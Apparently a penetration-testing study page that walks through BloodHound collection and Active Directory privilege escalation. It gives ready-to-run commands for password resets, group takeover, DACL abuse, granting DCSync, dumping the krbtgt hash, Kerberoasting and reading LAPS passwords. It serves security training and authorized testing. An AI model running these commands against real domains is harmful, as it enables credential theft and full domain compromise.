@@ -1,0 +1,247 @@
+
+> <b>Purpose:</b> collect AD relationship data once, then use it to answer a single question — <b>what is the shortest path from a principal I control to Domain Admin?</b> — and exploit the first edge on that path.
+
+## Collection options
+
+| Collector | Run from | Best when | Output |
+| --- | --- | --- | --- |
+| <code>bloodhound-python</code> | Kali | you have domain credentials and can reach the DC | JSON files |
+| <code>nxc ldap --bloodhound</code> | Kali | one command, no Python dependency | JSON files |
+| <code>SharpHound.exe</code> | Windows host | you are already on a domain-joined box; richest session data | ZIP |
+
+All three produce the same graph. Collect <b>once per engagement</b>; re-collecting after every change wastes time.
+
+## A. Collection
+
+### Step 01 — Collect with bloodhound-python
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+bloodhound-python -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -ns <DOMAIN_CONTROLLER_IP> -c All
+```
+
+<b>Look for:</b> <code>INFO: Found AD domain</code>, <code>INFO: Done in 00M 42S</code>, and a set of <code>.json</code> files in the current directory.<br /><b>Decision:</b> collection completes → Step 04. DNS errors → add <code>-dc <DOMAIN_CONTROLLER_IP></code> or point <code>-ns</code> at the DC. Access denied on sessions → Step 02 or <code>-c DCOnly</code>.<br /><b>Next:</b> Step 04.<br /><b>Common mistake:</b> running with <code>-c All</code> from a host that cannot reach every member server — session collection fails and you waste minutes. Use <code>-c DCOnly</code> for a fast, reliable baseline, then add <code>Session</code> later.<br /><b>Evidence:</b> the JSON file list and the collector's log.
+
+### Step 02 — Collect with NetExec
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+nxc ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> --bloodhound -c All
+```
+
+<b>Look for:</b> <code>BloodHound</code> in the nxc output and JSON files written to the working directory.<br /><b>Decision:</b> works → Step 04. <code>LDAP signing</code> or <code>channel binding</code> errors → use LDAPS or fall back to Step 01.<br /><b>Next:</b> Step 04.<br /><b>Common mistake:</b> forgetting <code>-c All</code> — without it you may get only a partial collection.<br /><b>Evidence:</b> the nxc output and the resulting files.
+
+### Step 03 — Collect with SharpHound (Windows)
+
+<b>Priority:</b> Conditional · <b>Run on:</b> target Windows host · <b>Status:</b> Documented
+
+```shen
+SharpHound.exe -c All --zipfilename loot.zip
+SharpHound.exe -c DCOnly --zipfilename dc.zip
+```
+
+<b>Look for:</b> <code>loot.zip</code> in the current directory.<br /><b>Decision:</b> AV removes SharpHound → use <code>bloodhound-python</code> from Kali instead of fighting the AV.<br /><b>Next:</b> transfer the ZIP to Kali and Step 04.<br /><b>Common mistake:</b> running <code>-c All</code> from a workstation with no privileges — session collection is noisy and may be blocked by the domain. <code>DCOnly</code> is safer for a first pass.<br /><b>Evidence:</b> the ZIP filename and collection log.
+
+### Step 04 — Verify and import
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+ls -la *.json *.zip 2>/dev/null
+python3 -c "import json,glob; [print(f, len(json.load(open(f))['data'])) for f in glob.glob('*_users.json')]"
+sudo neo4j start
+bloodhound --no-sandbox
+```
+
+<b>Look for:</b> a non-trivial user/computer count, then a successful import in the BloodHound GUI (Database Info shows the domain).<br /><b>Decision:</b> counts look sane → Step 05. Empty or tiny counts → re-collect (Step 01) with the DC as <code>-dc</code>.<br /><b>Next:</b> Step 05.<br /><b>Common mistake:</b> importing a ZIP that contains only <code>computers.json</code>. Check that users, groups and <code>gpos</code> are present before trusting the graph.<br /><b>Evidence:</b> the file list and the database info panel.
+
+## B. Querying
+
+### Step 05 — Shortest path to Domain Admin
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali (BloodHound UI) · <b>Status:</b> Syntax Checked
+
+```javascript
+MATCH p=shortestPath((u:User {name:"<USERNAME>@<DOMAIN>"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@<DOMAIN>"}))
+RETURN p
+```
+
+<b>Look for:</b> a path of 2-6 hops; the edges are the exploitation steps.<br /><b>Decision:</b> a path exists → read the <b>first</b> edge from your user and go to Section C. No path → check <code>Domain Users</code> → <code>Domain Admins</code> via nested groups, and re-collect.<br /><b>Next:</b> Section C.<br /><b>Common mistake:</b> reading the whole path and trying to exploit the last hop. You must walk it in order, starting from the only principal you control.<br /><b>Evidence:</b> a screenshot of the path with the edge labels.
+
+### Step 06 — Mark what you own
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali (BloodHound UI) · <b>Status:</b> Syntax Checked
+
+Right-click the principal you control → <b>Mark as Owned</b>. Then re-run Step 05; owned nodes get a skull and shortcut the analysis.
+
+<b>Look for:</b> every credential you have collected marked owned — users, computers, and groups.<br /><b>Decision:</b> multiple owned principals → query the shortest path from <b>any</b> owned node:
+
+```javascript
+MATCH p=shortestPath((o {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@<DOMAIN>"}))
+RETURN p
+```
+
+<b>Next:</b> Section C.<br /><b>Common mistake:</b> marking only the first user. The account you got from a share may be the better starting point.<br /><b>Evidence:</b> the owned-node list.
+
+### Step 07 — High-value queries
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali (BloodHound UI) · <b>Status:</b> Syntax Checked
+
+```javascript
+MATCH (u:User {hasspn:true}) RETURN u.name
+MATCH (u:User {dontreqpreauth:true}) RETURN u.name
+MATCH (c {unconstraineddelegation:true}) RETURN c.name
+MATCH (u:User)-[:HasSession]->(c:Computer) WHERE u.admincount=true RETURN u.name, c.name
+MATCH p=(a)-[:GenericAll|GenericWrite|WriteOwner|WriteDacl|ForceChangePassword]->(b) RETURN p
+```
+
+<b>Look for:</b> Kerberoastable service accounts, AS-REP roastable users, unconstrained delegation hosts, and DA sessions on member servers.<br /><b>Decision:</b> an ACL edge from an owned principal → Section C. A DA session → target that computer with the credential you hold.<br /><b>Next:</b> Section C or lateral movement.<br /><b>Common mistake:</b> chasing a Kerberoastable account with no path to DA. Check the path first, then crack.<br /><b>Evidence:</b> the query results.
+
+## C. Exploiting the edges
+
+### Step 08 — ForceChangePassword
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+net rpc password "<TARGET_USER>" -U "<DOMAIN>/<USERNAME>%<PASSWORD>" -S <DOMAIN_CONTROLLER_IP>
+# alternative, if net rpc is unavailable
+impacket-changepasswd -altuser '<DOMAIN>/<USERNAME>' -altpass '<PASSWORD>' -reset -newpass '<NEW_PASSWORD>' '<DOMAIN>/<TARGET_USER>'@<DOMAIN_CONTROLLER_IP>
+```
+
+<b>Look for:</b> <code>Password changed</code> or a successful bind.<br /><b>Decision:</b> success → authenticate as <code><TARGET_USER></code> and re-run Step 05 with the new owned node.<br /><b>Next:</b> Step 06.<br /><b>Common mistake:</b> changing a password that is in use by a service or a live session, breaking the box. Prefer accounts the path needs, not critical service accounts.<br /><b>Evidence:</b> the command and the successful authentication as the target.
+
+### Step 09 — GenericAll on a user
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+GenericAll on a user includes the right to reset their password — same action as <b>Step 08</b>, with no extra tooling. Use the command below; it is the Step 08 reset.
+
+```bash
+# GenericAll includes ResetPassword: this is the Step 08 command, reused
+net rpc password "<TARGET_USER>" -U "<DOMAIN>/<USERNAME>%<PASSWORD>" -S <DOMAIN_CONTROLLER_IP>
+```
+
+<b>Look for:</b> <code>Password changed</code>, then a fresh login as <code><TARGET_USER></code>.<br /><b>Decision:</b> reset succeeds → you own the target; re-run Step 05 and mark the new account owned. If the target is a DA, stop and collect proof.<br /><b>Next:</b> Step 06 (re-mark owned and re-collect) or Step 08 if the reset is refused.<br /><b>Common mistake:</b> assuming GenericAll always means "take over the account immediately". Check whether the account is <code>Account is sensitive and cannot be delegated</code> or protected by <code>AdminSDHolder</code>.<br /><b>Evidence:</b> the ACL edge, the reset, and the login.
+
+### Step 10 — AddMember / GenericAll on a group
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+net rpc group addmem "<GROUP>" "<TARGET_USER>" -U "<DOMAIN>/<USERNAME>%<PASSWORD>" -S <DOMAIN_CONTROLLER_IP>
+```
+
+<b>Look for:</b> no error, then group membership confirmed with <code>net rpc group members</code>.<br /><b>Decision:</b> works → re-collect or refresh BloodHound; your new group may open a path.<br /><b>Next:</b> Step 05 again.<br /><b>Common mistake:</b> adding yourself to <code>Domain Admins</code> when the edge is on a lesser group — read the edge target. Adding to a privileged group is loud; do it only when it is the path.<br /><b>Evidence:</b> the membership before and after.
+
+### Step 11 — WriteOwner
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+impacket-owneredit -action write -new-owner '<USERNAME>' -target '<TARGET>' -dc-ip <DOMAIN_CONTROLLER_IP> '<DOMAIN>/<USERNAME>:<PASSWORD>'
+impacket-dacledit -action write -rights FullControl -principal '<USERNAME>' -target '<TARGET>' -dc-ip <DOMAIN_CONTROLLER_IP> '<DOMAIN>/<USERNAME>:<PASSWORD>'
+```
+
+<b>Look for:</b> <code>Owner changed</code> then <code>DACL modified</code> — you are now owner <b>and</b> have FullControl, which turns WriteOwner into GenericAll.<br /><b>Decision:</b> owneredit succeeds but dacledit fails → grant yourself only the specific right you need (e.g. <code>ResetPassword</code>).<br /><b>Next:</b> Step 08 or Step 10 depending on the target type.<br /><b>Common mistake:</b> stopping after taking ownership. Ownership alone gives you the <b>ability</b> to change the DACL — you still have to do it.<br /><b>Evidence:</b> the ACL before/after and the action that followed.
+
+### Step 12 — WriteDACL to DCSync
+
+<b>Priority:</b> Advanced · <b>Run on:</b> Kali · <b>Status:</b> Documented
+
+```bash
+impacket-dacledit -action write -rights DCSync -principal '<USERNAME>' -target-dn 'DC=<DOMAIN>,DC=<TLD>' -dc-ip <DOMAIN_CONTROLLER_IP> '<DOMAIN>/<USERNAME>:<PASSWORD>'
+impacket-secretsdump -just-dc-ntlm <DOMAIN>/<USERNAME>:<PASSWORD>@<DOMAIN_CONTROLLER_IP>
+```
+
+<b>Look for:</b> <code>DACL modified</code> then the <code>krbtgt</code> hash from secretsdump.<br /><b>Decision:</b> DCSync rights granted → you have domain-wide credential access. This is the end of the chain.<br /><b>Next:</b> pass-the-hash or golden ticket (advanced).<br /><b>Common mistake:</b> writing DCSync on the wrong object. The target must be the <b>domain root</b> (<code>DC=…</code>), not a user.<br /><b>Evidence:</b> the DACL change and the dump.
+
+### Step 13 — GenericWrite (targeted Kerberoast or logon script)
+
+<b>Priority:</b> Advanced · <b>Run on:</b> Kali / Windows · <b>Status:</b> Environment Dependent
+
+GenericWrite lets you set a <code>servicePrincipalName</code> on the target user, making it Kerberoastable, then crack the ticket offline. It can also point <code>scriptPath</code> at a file you control.
+
+```bash
+# set an SPN, then roast (bloodyAD or PowerView on Windows)
+# bloodyAD is not installed on this host: use PowerView from a Windows session
+impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DOMAIN_CONTROLLER_IP> -request -outputfile kerb.txt
+```
+
+<b>Prerequisites:</b> writing the <code>servicePrincipalName</code> needs <code>bloodyAD</code> (<code>pipx install bloodyAD</code>) or PowerView from a Windows session — <code>bloodyAD</code> is <b>not</b> installed on the build host used for this audit, which is why this step is <b>Environment Dependent</b>. The roast itself uses <code>impacket-GetUserSPNs</code>, which is present on Kali.<br /><b>Look for:</b> a <code>$krb5tgs$</code> hash for the target account.<br /><b>Decision:</b> crack succeeds → you own the target without changing its password (quieter).<br /><b>Next:</b> authenticate as the target.<br /><b>Common mistake:</b> setting an SPN that collides with an existing one — the write fails or breaks a service.<br /><b>Evidence:</b> the modified attribute and the roasted ticket.
+
+### Step 14 — ReadLAPSPassword and gMSA
+
+<b>Priority:</b> Conditional · <b>Run on:</b> Kali · <b>Status:</b> Documented
+
+If BloodHound shows <code>ReadLAPSPassword</code> on a computer, the local admin password is stored in <code>ms-Mcs-AdmPwd</code> and readable with that right.
+
+```bash
+nxc ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --laps
+```
+
+<b>Look for:</b> a plaintext local administrator password per computer.<br /><b>Decision:</b> password returned → use it locally (<code>--local-auth</code>) on that host.<br /><b>Next:</b> local admin → Post-Exploitation page.<br /><b>Common mistake:</b> assuming LAPS is deployed everywhere. The edge must exist in BloodHound first.<br /><b>Evidence:</b> the retrieved password (redacted) and the host it belongs to.
+
+## D. Decision tree
+
+| What BloodHound shows | Do this | Do <b>not</b> |
+| --- | --- | --- |
+| Shortest path from owned to DA | Exploit the <b>first</b> edge (Section C) | Jump to the last hop |
+| ForceChangePassword / GenericAll on user | Reset password (Step 08/09) | Crack anything |
+| AddMember on a group | Add your user (Step 10) | Add to Domain Admins unless it is the path |
+| WriteOwner | owneredit → dacledit (Step 11) | Stop after taking ownership |
+| WriteDacl on the domain | Grant DCSync (Step 12) | Grant FullControl to everything |
+| GenericWrite on a user | Targeted Kerberoast (Step 13) | Change the password loudly |
+| ReadLAPSPassword | Read LAPS (Step 14) | Assume local admin everywhere |
+| DA session on a member server | Target that host | Attack the DC first |
+| No path at all | Re-collect with <code>-c All</code>; check nested groups | Conclude "AD is hardened" from one collection |
+
+## E. Troubleshooting
+
+| Symptom | Cause | Fix |
+| --- | --- | --- |
+| <code>Could not resolve</code> | DNS pointed at Kali | <code>-ns <DOMAIN_CONTROLLER_IP></code> or <code>-dc</code> |
+| Collection hangs on sessions | Member servers unreachable | <code>-c DCOnly</code> |
+| <code>LDAP signing required</code> | DC policy | Use LDAPS or SharpHound from Windows |
+| BloodHound shows no data | Import failed / wrong ZIP | Check the JSON counts before import |
+| Neo4j will not start | Java or stale lock | <code>sudo neo4j start</code>; check <code>neo4j status</code> |
+| No shortest path | Data stale or path needs a credential you do not have | Re-collect; check owned nodes |
+| owneredit <code>insufficient access</code> | You do not actually have WriteOwner | Verify the edge and the object |
+| dacledit <code>could not modify</code> | Inheritance/protected object | Try the specific right, or AdminSDHolder path |
+
+<b>Pivoting variant.</b> Through a pivot, BloodHound collection needs DNS <b>and</b> LDAP to the DC:
+
+```bash
+proxychains4 bloodhound-python -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -ns <DOMAIN_CONTROLLER_IP> --dns-tcp -c DCOnly
+proxychains4 nxc ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> --bloodhound -c All
+```
+
+Proxychains carries TCP only, so UDP DNS fails — add <code>--dns-tcp</code> or use IPs. If session collection must reach many hosts, run SharpHound from a compromised Windows host inside the network instead.
+
+## F. Evidence to preserve
+
+- The shortest-path screenshot with edge labels.
+- The ACL edge that justified the action, and the command output that changed it.
+- <code>whoami /groups</code> or <code>net group</code> showing the new membership.
+- The final proof: DA shell, DCSync krbtgt line (redacted), or domain admin proof file.
+
+## G. Related pages
+
+- [Active Directory — Complete Command Reference](https://app.notion.com/p/4011e51238b58122ac9bc9c86520d03e)
+- [Post-Exploitation & Lateral Movement — NetExec and Impacket](https://app.notion.com/p/4011e51238b58119b91aee453db12b4c)
+- <mention url="https://app.notion.com/p/4011e51238b581bbadcbe10d66d5ce31" /> — where the first credential often leaks
+- Windows Privilege Escalation — Complete Command Reference
+- OSCP Attack Workflow — Start Here
+
+## H. References
+
+- BloodHound docs: [https://bloodhound.readthedocs.io/](https://bloodhound.readthedocs.io/)
+- bloodhound-python: [https://github.com/dirkjanm/BloodHound.py](https://github.com/dirkjanm/BloodHound.py)
+- SharpHound: [https://github.com/SpecterOps/SharpHound](https://github.com/SpecterOps/SharpHound)
+- BloodHound Cypher cheat sheet: [https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html)
+
+## I. Verification note
+
+<code>bloodhound-python</code>, <code>nxc</code> (with <code>--bloodhound</code>), <code>impacket-owneredit</code>, <code>impacket-dacledit</code>, <code>impacket-changepasswd</code>, <code>impacket-secretsdump</code>, <code>net</code> and <code>rpcclient</code> are installed here and their help output was checked, so those commands are <b>Syntax Checked</b>. <code>SharpHound.exe</code>, <code>bloodyAD</code> and PowerView are not installed, and no live domain was queried for this page, so those steps are <b>Documented</b>; no step is <b>Lab Tested</b>.
